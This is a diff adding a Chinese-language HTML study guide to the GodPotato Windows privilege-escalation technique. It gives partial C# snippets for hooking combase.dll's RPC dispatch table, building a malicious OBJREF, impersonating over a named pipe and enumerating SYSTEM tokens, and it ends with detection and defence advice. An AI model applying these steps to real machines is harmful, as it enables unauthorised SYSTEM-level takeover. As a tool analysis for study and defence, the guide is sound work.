@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GodPotato 技术学习指南</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Microsoft YaHei', 'Segoe UI', Arial, sans-serif;
+            line-height: 1.8;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            color: #e4e4e4;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            border: 1px solid #4a3f8a;
+            text-align: center;
+        }
+        h1 {
+            color: #f39c12;
+            font-size: 2.5em;
+            margin-bottom: 15px;
+        }
+        .subtitle {
+            color: #a4a4a4;
+            font-size: 1.1em;
+        }
+        .section {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid #4a3f8a;
+        }
+        h2 {
+            color: #f39c12;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #4a3f8a;
+        }
+        h3 {
+            color: #3498db;
+            font-size: 1.4em;
+            margin: 20px 0 15px 0;
+        }
+        h4 {
+            color: #e74c3c;
+            font-size: 1.2em;
+            margin: 15px 0 10px 0;
+        }
+        p {
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+        .flow-diagram {
+            background: rgba(74, 63, 138, 0.3);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .flow-step {
+            display: inline-block;
+            background: #4a3f8a;
+            padding: 12px 20px;
+            border-radius: 5px;
+            margin: 5px;
+            color: #3498db;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        .flow-arrow {
+            display: inline-block;
+            color: #f39c12;
+            font-size: 1.2em;
+            margin: 0 5px;
+        }
+        .code-block {
+            background: #1e1e2e;
+            border: 1px solid #4a3f8a;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+        .code-block code {
+            color: #c9d1d9;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .keyword {
+            color: #ff7b72;
+        }
+        .function {
+            color: #d2a8ff;
+        }
+        .string {
+            color: #a5d6ff;
+        }
+        .comment {
+            color: #8b949e;
+        }
+        .number {
+            color: #79c0ff;
+        }
+        .api-card {
+            background: rgba(74, 63, 138, 0.4);
+            border: 1px solid #3498db;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        .api-name {
+            color: #3498db;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .api-desc {
+            color: #a4a4a4;
+            margin-bottom: 10px;
+        }
+        .api-doc-link {
+            display: inline-block;
+            background: #f39c12;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+        .api-doc-link:hover {
+            background: #e67e22;
+        }
+        .warning-box {
+            background: rgba(231, 76, 60, 0.2);
+            border: 2px solid #e74c3c;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .warning-title {
+            color: #e74c3c;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+        .info-box {
+            background: rgba(52, 152, 219, 0.15);
+            border: 2px solid #3498db;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .info-title {
+            color: #3498db;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+        ul, ol {
+            margin: 15px 0;
+            padding-left: 30px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .tech-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .tech-item {
+            background: rgba(74, 63, 138, 0.3);
+            padding: 20px;
+            border-radius: 8px;
+            border-left: 4px solid #f39c12;
+        }
+        .tech-title {
+            color: #f39c12;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border: 1px solid #4a3f8a;
+        }
+        th {
+            background: #4a3f8a;
+            color: #3498db;
+        }
+        td {
+            background: rgba(0, 0, 0, 0.2);
+        }
+        .nav-menu {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .nav-menu a {
+            color: #3498db;
+            text-decoration: none;
+            margin: 0 15px;
+            padding: 5px 10px;
+        }
+        .nav-menu a:hover {
+            background: #4a3f8a;
+            border-radius: 3px;
+        }
+        .structure-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #f39c12;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .structure-title {
+            color: #f39c12;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .comparison-table {
+            margin: 20px 0;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #a4a4a4;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>GodPotato 技术学习指南</h1>
+            <p class="subtitle">DCOM OXID解析Hook与权限提升深度解析</p>
+        </header>
+
+        <nav class="nav-menu">
+            <a href="#overview">项目概述</a>
+            <a href="#attack-flow">攻击流程</a>
+            <a href="#hook-tech">Hook技术</a>
+            <a href="#oxid-resolver">OXID解析</a>
+            <a href="#objref">OBJREF结构</a>
+            <a href="#token-ops">令牌操作</a>
+            <a href="#comparison">技术对比</a>
+            <a href="#defense">防御检测</a>
+        </nav>
+
+        <section id="overview">
+            <h2>项目概述</h2>
+            <p>GodPotato是基于DCOM/COM机制的Windows本地提权工具。其核心创新在于直接Hook RPC运行时库(combase.dll)中的函数，控制OXID解析过程，诱导RPCSS服务连接到攻击者的命名管道，实现权限提升。</p>
+            
+            <div class="info-box">
+                <div class="info-title">技术特点</div>
+                <ul>
+                    <li>直接Hook系统DLL，不依赖特定服务行为</li>
+                    <li>利用DCOM基础设施的信任关系</li>
+                    <li>结合令牌枚举实现完整权限提升</li>
+                    <li>适用Windows 2012-2019, Windows 8-10</li>
+                </ul>
+            </div>
+
+            <h3>核心依赖</h3>
+            <table>
+                <tr>
+                    <th>组件</th>
+                    <th>作用</th>
+                </tr>
+                <tr>
+                    <td>combase.dll</td>
+                    <td>RPC运行时库，包含OXID解析器接口</td>
+                </tr>
+                <tr>
+                    <td>RPCSS服务</td>
+                    <td>DCOM服务控制管理器，以高权限运行</td>
+                </tr>
+                <tr>
+                    <td>SharpToken</td>
+                    <td>令牌操作库，用于令牌枚举和进程创建</td>
+                </tr>
+            </table>
+        </section>
+
+        <section id="attack-flow">
+            <h2>攻击流程</h2>
+            <div class="flow-diagram">
+                <div class="flow-step">1. Hook RPC分发表</div>
+                <span class="flow-arrow">→</span>
+                <div class="flow-step">2. 启动管道服务器</div>
+                <span class="flow-arrow">→</span>
+                <div class="flow-step">3. 构造OBJREF</div>
+                <span class="flow-arrow">→</span>
+                <div class="flow-step">4. 触发OXID解析</div>
+                <span class="flow-arrow">→</span>
+                <div class="flow-step">5. 端点重定向</div>
+                <span class="flow-arrow">→</span>
+                <div class="flow-step">6. 管道连接</div>
+                <span class="flow-arrow">→</span>
+                <div class="flow-step">7. 令牌模拟</div>
+                <span class="flow-arrow">→</span>
+                <div class="flow-step">8. 创建进程</div>
+            </div>
+
+            <h3>关键步骤详解</h3>
+            <table>
+                <tr>
+                    <th>阶段</th>
+                    <th>操作</th>
+                    <th>技术要点</th>
+                </tr>
+                <tr>
+                    <td>准备阶段</td>
+                    <td>Hook combase.dll分发表</td>
+                    <td>搜索RPC接口，修改内存保护，替换函数指针</td>
+                </tr>
+                <tr>
+                    <td>触发阶段</td>
+                    <td>构造恶意OBJREF并解组</td>
+                    <td>修改DualStringArray，指向攻击者管道</td>
+                </tr>
+                <tr>
+                    <td>利用阶段</td>
+                    <td>RPCSS连接管道</td>
+                    <td>被Hook的函数返回自定义端点绑定</td>
+                </tr>
+                <tr>
+                    <td>提升阶段</td>
+                    <td>模拟令牌并搜索SYSTEM令牌</td>
+                    <td>遍历进程句柄，筛选高权限令牌</td>
+                </tr>
+            </table>
+        </section>
+
+        <section id="hook-tech">
+            <h2>RPC Hook技术详解</h2>
+
+            <h3>目标接口识别</h3>
+            <p>GodPotato搜索combase.dll中的特定RPC接口：</p>
+            <div class="code-block">
+                <code>
+<span class="comment">// IObjectExporter/OXID解析器接口GUID</span>
+<span class="keyword">private static readonly Guid</span> orcbRPCGuid = <span class="keyword">new</span> <span class="function">Guid</span>(<span class="string">"18f70770-8e64-11cf-9af1-0020af6e72f4"</span>);
+                </code>
+            </div>
+
+            <h3>内存结构解析</h3>
+            <div class="structure-box">
+                <div class="structure-title">RPC_SERVER_INTERFACE结构</div>
+                <div class="code-block">
+                    <code>
+<span class="keyword">struct</span> RPC_SERVER_INTERFACE {
+    <span class="keyword">uint</span> Length;                        <span class="comment">// 结构大小</span>
+    RPC_SYNTAX_IDENTIFIER InterfaceId;    <span class="comment">// 接口标识</span>
+    RPC_SYNTAX_IDENTIFIER TransferSyntax; <span class="comment">// 传输语法</span>
+    <span class="keyword">IntPtr</span> DispatchTable;               <span class="comment">// 分发表指针</span>
+    <span class="keyword">uint</span> RpcProtseqEndpointCount;       <span class="comment">// 端点计数</span>
+    <span class="keyword">IntPtr</span> InterpreterInfo;             <span class="comment">// MIDL_SERVER_INFO指针</span>
+    <span class="keyword">uint</span> Flags;
+}
+                    </code>
+                </div>
+            </div>
+
+            <div class="structure-box">
+                <div class="structure-title">MIDL_SERVER_INFO结构</div>
+                <div class="code-block">
+                    <code>
+<span class="keyword">struct</span> MIDL_SERVER_INFO {
+    <span class="keyword">IntPtr</span> pStubDesc;        <span class="comment">// Stub描述符</span>
+    <span class="keyword">IntPtr</span> DispatchTable;    <span class="comment">// 函数指针数组(关键Hook点)</span>
+    <span class="keyword">IntPtr</span> ProcString;       <span class="comment">// 过程格式字符串</span>
+    <span class="keyword">IntPtr</span> FmtStringOffset;  <span class="comment">// 格式字符串偏移表</span>
+    <span class="keyword">IntPtr</span> ThunkTable;
+    <span class="keyword">IntPtr</span> pTransferSyntax;
+    <span class="keyword">IntPtr</span> nCount;
+    <span class="keyword">IntPtr</span> pSyntaxInfo;
+}
+                    </code>
+                </div>
+            </div>
+
+            <h3>Hook实现</h3>
+            <div class="code-block">
+                <code>
+<span class="keyword">public void</span> <span class="function">HookRPC</span>() {
+    <span class="keyword">uint</span> old;
+    <span class="comment">// 修改内存保护为可读写</span>
+    <span class="function">VirtualProtect</span>(DispatchTablePtr, 
+        (<span class="keyword">uint</span>)(IntPtr.Size * dispatchTable.Length), 
+        <span class="number">0x04</span>, <span class="comment">// PAGE_READWRITE</span>
+        <span class="keyword">out</span> old);
+    
+    <span class="comment">// 替换第一个函数指针</span>
+    <span class="function">Marshal.WriteIntPtr</span>(DispatchTablePtr, 
+        <span class="function">Marshal.GetFunctionPointerForDelegate</span>(useProtseqDelegate));
+    
+    IsHook = <span class="keyword">true</span>;
+}
+                </code>
+            </div>
+
+            <div class="api-card">
+                <div class="api-name">VirtualProtect</div>
+                <div class="api-desc">修改内存区域的保护属性，使只读内存变为可写。</div>
+                <p>参数说明：</p>
+                <ul>
+                    <li>pBlock: 内存块地址</li>
+                    <li>size: 内存块大小</li>
+                    <li>newProtect: 新保护属性(0x04 = PAGE_READWRITE)</li>
+                    <li>oldProtect: 原保护属性输出</li>
+                </ul>
+                <a href="https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect" class="api-doc-link" target="_blank">微软官方文档</a>
+            </div>
+        </section>
+
+        <section id="oxid-resolver">
+            <h2>OXID解析机制</h2>
+
+            <h3>什么是OXID解析</h3>
+            <p>OXID(Object Exporter ID)是DCOM中用于定位对象所在进程的标识符。当客户端需要连接到远程DCOM对象时，需要通过OXID解析器获取对象的绑定信息(协议序列和网络地址)。</p>
+
+            <div class="info-box">
+                <div class="info-title">OXID解析流程</div>
+                <ol>
+                    <li>客户端从OBJREF中提取OXID</li>
+                    <li>调用RPCSS服务的OXID解析接口</li>
+                    <li>RPCSS查找OXID对应的绑定信息</li>
+                    <li>返回DualStringArray(包含协议和地址)</li>
+                    <li>客户端使用绑定信息连接对象</li>
+                </ol>
+            </div>
+
+            <h3>自定义端点解析</h3>
+            <p>当Hook生效后，RPCSS调用被替换的函数获取绑定信息：</p>
+            <div class="code-block">
+                <code>
+<span class="keyword">public int</span> <span class="function">fun</span>(<span class="keyword">IntPtr</span> ppdsaNewBindings, <span class="keyword">IntPtr</span> ppdsaNewSecurity) {
+    <span class="comment">// 构造自定义端点列表</span>
+    <span class="keyword">string[]</span> endpoints = { 
+        godPotatoContext.clientPipe,  <span class="comment">// 攻击者管道</span>
+        <span class="string">"ncacn_ip_tcp:fuck you !"</span>   <span class="comment">// 无效TCP端点</span>
+    };
+    
+    <span class="comment">// 构造DualStringArray</span>
+    <span class="keyword">IntPtr</span> pdsaNewBindings = <span class="function">Marshal.AllocHGlobal</span>(memroySize);
+    
+    <span class="comment">// 写入端点绑定信息</span>
+    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i < endpoints.Length; i++) {
+        <span class="comment">// 写入协议序列和网络地址</span>
+        <span class="function">Marshal.WriteInt16</span>(pdsaNewBindings, offset, ...);
+    }
+    
+    <span class="comment">// 返回结果</span>
+    <span class="function">Marshal.WriteIntPtr</span>(ppdsaNewBindings, pdsaNewBindings);
+    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 成功</span>
+}
+                </code>
+            </div>
+
+            <h3>端点格式</h3>
+            <table>
+                <tr>
+                    <th>协议序列</th>
+                    <th>值</th>
+                    <th>说明</th>
+                </tr>
+                <tr>
+                    <td>EPM_PROTOCOL_TCP</td>
+                    <td>0x07</td>
+                    <td>TCP协议</td>
+                </tr>
+                <tr>
+                    <td>EPM_PROTOCOL_NAMED_PIPE</td>
+                    <td>0x10</td>
+                    <td>命名管道</td>
+                </tr>
+                <tr>
+                    <td>EPM_PROTOCOL_NCALRPC</td>
+                    <td>0x0c</td>
+                    <td>本地RPC</td>
+                </tr>
+            </table>
+        </section>
+
+        <section id="objref">
+            <h2>OBJREF结构详解</h2>
+
+            <h3>OBJREF格式</h3>
+            <p>OBJREF是DCOM对象引用的序列化格式，包含对象位置和绑定信息。</p>
+
+            <div class="structure-box">
+                <div class="structure-title">OBJREF头部</div>
+                <div class="code-block">
+                    <code>
+<span class="keyword">const uint</span> Signature = <span class="number">0x574f454d</span>;  <span class="comment">// "MEOW"</span>
+
+<span class="keyword">enum</span> Type : <span class="keyword">uint</span> {
+    Standard = <span class="number">0x1</span>,   <span class="comment">// 标准对象引用</span>
+    Handler = <span class="number">0x2</span>,   <span class="comment">// 处理器对象引用</span>
+    Custom = <span class="number">0x4</span>     <span class="comment">// 自定义对象引用</span>
+}
+                    </code>
+                </div>
+            </div>
+
+            <div class="structure-box">
+                <div class="structure-title">STDOBJREF结构</div>
+                <div class="code-block">
+                    <code>
+<span class="keyword">struct</span> Standard {
+    <span class="keyword">uint</span> Flags;           <span class="comment">// 标志位</span>
+    <span class="keyword">uint</span> PublicRefs;      <span class="comment">// 公共引用计数</span>
+    <span class="keyword">ulong</span> OXID;           <span class="comment">// 对象导出器标识符</span>
+    <span class="keyword">ulong</span> OID;            <span class="comment">// 对象标识符</span>
+    <span class="keyword">Guid</span> IPID;            <span class="comment">// 接口指针标识符</span>
+    DualStringArray;      <span class="comment">// 绑定信息数组</span>
+}
+                    </code>
+                </div>
+            </div>
+
+            <h3>构造恶意OBJREF</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 获取原始OBJREF模板</span>
+<span class="function">moniker.GetDisplayName</span>(bindCtx, <span class="keyword">null</span>, <span class="keyword">out</span> ppszDisplayName);
+<span class="keyword">byte[]</span> objrefBytes = <span class="function">Convert.FromBase64String</span>(...);
+
+<span class="comment">// 构造恶意OBJREF</span>
+ObjRef objRef = <span class="keyword">new</span> <span class="function">ObjRef</span>(IID_IUnknown,
+    <span class="keyword">new</span> <span class="function">ObjRef.Standard</span>(<span class="number">0</span>, <span class="number">1</span>, oxid, oid, ipid,
+        <span class="keyword">new</span> <span class="function">ObjRef.DualStringArray</span>(
+            <span class="keyword">new</span> <span class="function">ObjRef.StringBinding</span>(TowerProtocol.EPM_PROTOCOL_TCP, <span class="string">"127.0.0.1"</span>),
+            <span class="keyword">new</span> <span class="function">ObjRef.SecurityBinding</span>(<span class="number">0xa</span>, <span class="number">0xffff</span>, <span class="keyword">null</span>))));
+
+<span class="comment">// 触发解组</span>
+<span class="function">UnmarshalDCOM.UnmarshalObject</span>(data, <span class="keyword">out</span> ppv);
+                </code>
+            </div>
+
+            <div class="api-card">
+                <div class="api-name">CoUnmarshalInterface</div>
+                <div class="api-desc">使用流中的数据初始化代理对象，触发OXID解析过程。</div>
+                <p>安全警告：使用不可信数据调用此方法是安全风险！</p>
+                <a href="https://learn.microsoft.com/windows/win32/api/combaseapi/nf-combaseapi-counmarshalinterface" class="api-doc-link" target="_blank">微软官方文档</a>
+            </div>
+        </section>
+
+        <section id="token-ops">
+            <h2>令牌操作技术</h2>
+
+            <h3>命名管道模拟</h3>
+            <div class="code-block">
+                <code>
+<span class="comment">// 创建命名管道</span>
+pipeServerHandle = <span class="function">CreateNamedPipe</span>(serverPipe, 
+    PIPE_ACCESS_DUPLEX, 
+    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 
+    PIPE_UNLIMITED_INSTANCES, <span class="number">521</span>, <span class="number">0</span>, <span class="number">123</span>, 
+    <span class="keyword">ref</span> securityAttributes);
+
+<span class="comment">// 等待连接</span>
+<span class="function">ConnectNamedPipe</span>(pipeServerHandle, IntPtr.Zero);
+
+<span class="comment">// 模拟客户端</span>
+<span class="keyword">if</span> (<span class="function">ImpersonateNamedPipeClient</span>(pipeServerHandle)) {
+    systemIdentity = <span class="function">WindowsIdentity.GetCurrent</span>();
+}
+                </code>
+            </div>
+
+            <h3>令牌枚举</h3>
+            <p>使用NtQuerySystemInformation获取系统所有句柄：</p>
+            <div class="code-block">
+                <code>
+<span class="comment">// 获取系统句柄信息</span>
+<span class="function">NtQuerySystemInformation</span>(SystemExtendedHandleInformation, ...);
+
+<span class="comment">// 遍历所有句柄</span>
+<span class="keyword">foreach</span> (var handleInfo <span class="keyword">in</span> handleInfos) {
+    <span class="comment">// 复制句柄</span>
+    <span class="function">NtDuplicateObject</span>(sourceProcess, handle, currentProcess, ...);
+    
+    <span class="comment">// 查询对象类型</span>
+    <span class="function">NtQueryObject</span>(dupHandle, ObjectTypeInformation, ...);
+    
+    <span class="keyword">if</span> (typeName == <span class="string">"Token"</span>) {
+        <span class="comment">// 获取令牌信息</span>
+        <span class="function">GetTokenInformation</span>(dupHandle, TokenUser, ...);
+        <span class="function">GetTokenInformation</span>(dupHandle, TokenIntegrityLevel, ...);
+        
+        <span class="comment">// 筛选SYSTEM令牌</span>
+        <span class="keyword">if</span> (SID == <span class="string">"S-1-5-18"</span> && 
+            ImpersonationLevel >= Impersonation &&
+            IntegrityLevel >= SystemIntegrity) {
+            <span class="comment">// 找到目标令牌</span>
+        }
+    }
+}
+                </code>
+            </div>
+
+            <h3>完整性级别</h3>
+            <table>
+                <tr>
+                    <th>级别</th>
+                    <th>值</th>
+                    <th>说明</th>
+                </tr>
+                <tr>
+                    <td>Untrusted</td>
+                    <td>0x00000000</td>
+                    <td>不可信级别</td>
+                </tr>
+                <tr>
+                    <td>LowIntegrity</td>
+                    <td>0x00001000</td>
+                    <td>低完整性级别</td>
+                </tr>
+                <tr>
+                    <td>MediumIntegrity</td>
+                    <td>0x00002000</td>
+                    <td>中等完整性级别</td>
+                </tr>
+                <tr>
+                    <td>HighIntegrity</td>
+                    <td>0x00003000</td>
+                    <td>高完整性级别</td>
+                </tr>
+                <tr>
+                    <td>SystemIntegrity</td>
+                    <td>0x00004000</td>
+                    <td>系统完整性级别</td>
+                </tr>
+            </table>
+
+            <div class="api-card">
+                <div class="api-name">NtQuerySystemInformation</div>
+                <div class="api-desc">查询系统信息，包括所有进程的句柄信息。</div>
+                <p>关键参数：SystemExtendedHandleInformation (0x40)</p>
+            </div>
+
+            <div class="api-card">
+                <div class="api-name">NtDuplicateObject</div>
+                <div class="api-desc">复制其他进程的句柄到当前进程。</div>
+                <p>用于获取其他进程中的令牌句柄。</p>
+            </div>
+        </section>
+
+        <section id="comparison">
+            <h2>Potato技术对比</h2>
+
+            <table class="comparison-table">
+                <tr>
+                    <th>特性</th>
+                    <th>GodPotato</th>
+                    <th>BadPotato</th>
+                    <th>JuicyPotato</th>
+                </tr>
+                <tr>
+                    <td>触发机制</td>
+                    <td>DCOM OXID解析Hook</td>
+                    <td>Print Spooler RPC</td>
+                    <td>DCOM激活请求</td>
+                </tr>
+                <tr>
+                    <td>目标服务</td>
+                    <td>RPCSS</td>
+                    <td>Print Spooler</td>
+                    <td>多种DCOM服务</td>
+                </tr>
+                <tr>
+                    <td>适用系统</td>
+                    <td>Win2012-Win2019</td>
+                    <td>Win2012-Win2019</td>
+                    <td>Win2008-Win2016</td>
+                </tr>
+                <tr>
+                    <td>权限要求</td>
+                    <td>SeImpersonatePrivilege</td>
+                    <td>SeImpersonatePrivilege</td>
+                    <td>SeImpersonatePrivilege</td>
+                </tr>
+                <tr>
+                    <td>技术复杂度</td>
+                    <td>高(需要Hook)</td>
+                    <td>中</td>
+                    <td>中</td>
+                </tr>
+                <tr>
+                    <td>稳定性</td>
+                    <td>较高</td>
+                    <td>较高</td>
+                    <td>较低</td>
+                </tr>
+                <tr>
+                    <td>创新点</td>
+                    <td>直接Hook系统DLL</td>
+                    <td>利用路径解析特性</td>
+                    <td>利用DCOM激活</td>
+                </tr>
+            </table>
+
+            <h3>GodPotato的优势</h3>
+            <div class="info-box">
+                <div class="info-title">技术优势</div>
+                <ul>
+                    <li>不依赖特定服务行为，更通用</li>
+                    <li>Hook机制更隐蔽，难以通过服务监控检测</li>
+                    <li>结合令牌枚举，确保获取完整SYSTEM权限</li>
+                    <li>适用于更多Windows版本</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="defense">
+            <h2>防御与检测</h2>
+
+            <h3>检测方法</h3>
+            <table>
+                <tr>
+                    <th>检测点</th>
+                    <th>方法</th>
+                    <th>特征</th>
+                </tr>
+                <tr>
+                    <td>内存修改</td>
+                    <td>监控combase.dll内存完整性</td>
+                    <td>分发表指针被修改</td>
+                </tr>
+                <tr>
+                    <td>VirtualProtect调用</td>
+                    <td>监控关键DLL内存保护修改</td>
+                    <td>将只读内存改为可写</td>
+                </tr>
+                <tr>
+                    <td>OBJREF异常</td>
+                    <td>分析解组的OBJREF结构</td>
+                    <td>绑定信息指向异常路径</td>
+                </tr>
+                <tr>
+                    <td>命名管道</td>
+                    <td>监控异常管道创建</td>
+                    <td>包含"GodPotato"等特征字符串</td>
+                </tr>
+                <tr>
+                    <td>令牌操作</td>
+                    <td>监控敏感API调用序列</td>
+                    <td>模拟后立即创建进程</td>
+                </tr>
+            </table>
+
+            <h3>防御措施</h3>
+            <div class="warning-box">
+                <div class="warning-title">建议防御措施</div>
+                <ol>
+                    <li>部署代码完整性保护，防止DLL内存修改</li>
+                    <li>实施内存完整性监控，检测关键DLL修改</li>
+                    <li>严格限制SeImpersonatePrivilege权限分配</li>
+                    <li>监控NtQuerySystemInformation等敏感API</li>
+                    <li>部署EDR解决方案，检测异常行为模式</li>
+                    <li>审计服务账户权限配置</li>
+                </ol>
+            </div>
+
+            <h3>权限要求说明</h3>
+            <div class="info-box">
+                <div class="info-title">SeImpersonatePrivilege权限</div>
+                <p>该权限是成功执行此攻击的关键前提。以下账户通常拥有此权限：</p>
+                <ul>
+                    <li>Administrators组</li>
+                    <li>LOCAL SERVICE</li>
+                    <li>NETWORK SERVICE</li>
+                    <li>SERVICE组</li>
+                    <li>IIS应用程序池账户</li>
+                    <li>SQL Server服务账户</li>
+                </ul>
+            </div>
+        </section>
+
+        <section>
+            <h2>学习要点总结</h2>
+
+            <div class="tech-grid">
+                <div class="tech-item">
+                    <div class="tech-title">DCOM架构</div>
+                    <ul>
+                        <li>OXID解析机制</li>
+                        <li>OBJREF结构格式</li>
+                        <li>RPCSS服务角色</li>
+                        <li>绑定信息构造</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">RPC内部结构</div>
+                    <ul>
+                        <li>RPC_SERVER_INTERFACE</li>
+                        <li>MIDL_SERVER_INFO</li>
+                        <li>分发表机制</li>
+                        <li>内存保护修改</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">令牌操作</div>
+                    <ul>
+                        <li>完整性级别</li>
+                        <li>模拟级别</li>
+                        <li>句柄枚举</li>
+                        <li>令牌筛选</li>
+                    </ul>
+                </div>
+
+                <div class="tech-item">
+                    <div class="tech-title">COM编程</div>
+                    <ul>
+                        <li>Moniker接口</li>
+                        <li>对象引用序列化</li>
+                        <li>解组过程</li>
+                        <li>绑定上下文</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>本文档仅供安全研究和学习使用，请勿用于非法用途</p>
+            <p>GodPotato项目分析 - Windows DCOM提权技术研究</p>
+        </footer>
+    </div>
+</body>
+</html>
